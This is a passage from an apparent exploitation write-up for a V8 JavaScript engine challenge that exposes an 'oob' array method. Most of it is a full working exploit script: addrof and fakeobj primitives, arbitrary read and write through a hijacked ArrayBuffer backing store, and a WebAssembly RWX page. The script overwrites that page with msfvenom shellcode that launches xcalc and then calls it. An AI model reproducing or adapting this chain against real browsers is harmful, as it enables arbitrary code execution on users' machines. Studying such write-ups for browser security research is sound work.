</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span><span style="color:#f92672">=</span>[					
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x90909090</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x90909090</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x782fb848</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x636c6163</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x48500000</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x73752fb8</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x69622f72</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x8948506e</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0xc03148e7</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x89485750</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0xd23148e6</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x3ac0c748</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x50000030</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x4944b848</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x414c5053</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x48503d59</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x3148e289</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x485250c0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0xc748e289</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x00003bc0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x050f00</span>
</span></span><span style="display:flex;"><span>];</span></span></code></pre></div></p>
<p>As is probably obvious at this point, we need to change the <code>ArrayBuffer</code>&rsquo;s <code>backing store</code> to point to the <code>rwx_page_addr</code>. The way we can find the location of the <code>ArrayBuffer</code> backing store is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>				+-----------------+           +-----------------+
</span></span><span style="display:flex;"><span>				|  ArrayBuffer    |     +----&gt;|  RWX PAGE       |
</span></span><span style="display:flex;"><span>				|                 |     |     |                 |
</span></span><span style="display:flex;"><span>				| 0x0:  map       |     |     |                 |
</span></span><span style="display:flex;"><span>				| 0x8:  properties|     |     |                 |
</span></span><span style="display:flex;"><span>				| 0x10: elements  |     |     |                 |
</span></span><span style="display:flex;"><span>				| 0x18: byteLength|     |     |                 |
</span></span><span style="display:flex;"><span>				| 0x20: backingStore ---+     |                 |
</span></span><span style="display:flex;"><span>				| 0x24: flags     |           |                 |
</span></span><span style="display:flex;"><span>				+-----------------+           +-----------------+</span></span></code></pre></div>
<p>Following is the whole exploit script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/// Helper functions to convert between float and integer primitives
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>); <span style="color:#75715e">// 8 byte array buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u64_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">val</span>) { <span style="color:#75715e">// typeof(val) = float
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">f64_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">val</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> (<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>); <span style="color:#75715e">// Watch for little endianness
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">val</span>) { <span style="color:#75715e">// typeof(val) = BigInt
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">val</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">u64_buf</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">val</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f64_buf</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fl_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fl_arr_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp_obj</span> <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">tmp_obj</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_arr_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">in_obj</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// setting the object we want the address of as an element of obj_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">obj_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">in_obj</span>; 	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. changing the map of obj_arr for the fl_arr map.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">fl_arr_map</span>); 	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// even though we are accesing obj_arr, the returned element will be a float
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>[<span style="color:#ae81ff">0</span>];	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. restoring the map of the object for the original one
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">obj_arr_map</span>);	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// returning the integer representation of the leaked pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>);	
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// storing the float value of an arbitrary address as an element of fl_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fl_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">addr</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. replacing the map of the fl_arr to that of the obj_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">obj_arr_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// even though we are accessing fl_arr, the retur&lt;F3&gt;ned element will be a tagged pointer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fl_arr</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// oob write. restoring original map of fl_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">fl_arr_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// returning tagged pointer of arbitrary address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fake</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arb_rw_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">fl_arr_map</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>, <span style="color:#ae81ff">1.4</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// We have to use tagged pointers for reading, so we tag the addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">addr</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">addr</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arb_rw_arr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Change the elements pointer using our crafted array to read_addr-0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arb_rw_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Index 0 will then return the value at read_addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Place a fakeobj right on top of our crafted array with a float array map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">arb_rw_arr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Change the elements pointer using our crafted array to write_addr-0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arb_rw_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">addr</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Write to index 0 as a floating point value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fake</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">val</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">val</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// creating an ArrayBuffer holding the value of a 64-bit pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// creating a dataview for the ArrayBuffer object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieving the address of the ArrayBuffer object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieveing the address of the backing_store pointer of the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// ArrayBuffer object located at offset +0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// overwritting the backing_store pointer with the value we desire
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// to overwrite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// using the dataview to dereference the backing pointer and to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// do the write for us
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">val</span>), <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// syntax: setBigUint64(byteOffset, value, littleEndian)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">exploit</span>() {
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// based on https://wasdk.github.io/WasmFiddle/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// this is some &#39;container&#39; code implementing a return 0 to force 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// the creation of a RWX page. contents will be overwritten with shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_code</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">115</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">133</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">96</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">127</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">130</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">112</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">131</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">129</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">145</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">109</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">111</span>,<span style="color:#ae81ff">114</span>,<span style="color:#ae81ff">121</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">138</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,
</span></span><span style="display:flex;"><span>			<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">132</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">65</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">11</span>]
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_mod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasm_code</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wasm_instance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasm_mod</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieving entry-point of wasm instance
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm_instance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// retrieving rwx page base at offset 0x88 from wasm instance
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">wasm_instance</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x88</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copy_shellcode</span>(<span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">shellcode</span>) {
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataview</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DataView</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	    <span style="color:#75715e">// retrieving ArrayBuffer&#39;s backing store pointer at offset 0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">backing_store_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_addr</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>	    <span style="color:#a6e22e">initial_arb_write</span>(<span style="color:#a6e22e">backing_store_addr</span>, <span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">shellcode</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dataview</span>.<span style="color:#a6e22e">setUint32</span>(<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">shellcode</span>[<span style="color:#a6e22e">i</span>], <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>	    }
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">shellcode</span><span style="color:#f92672">=</span>[					
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x90909090</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x90909090</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x782fb848</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x636c6163</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x48500000</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x73752fb8</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x69622f72</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x8948506e</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0xc03148e7</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x89485750</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0xd23148e6</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x3ac0c748</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x50000030</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x4944b848</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x414c5053</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x48503d59</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x3148e289</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x485250c0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0xc748e289</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x00003bc0</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">0x050f00</span>
</span></span><span style="display:flex;"><span>	];
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">copy_shellcode</span>(<span style="color:#a6e22e">rwx_page_addr</span>, <span style="color:#a6e22e">shellcode</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">f</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exploit</span>();</span></span></code></pre></div>
<p>The <code>exploit.html</code> layout should be as follows for the exploit to work:
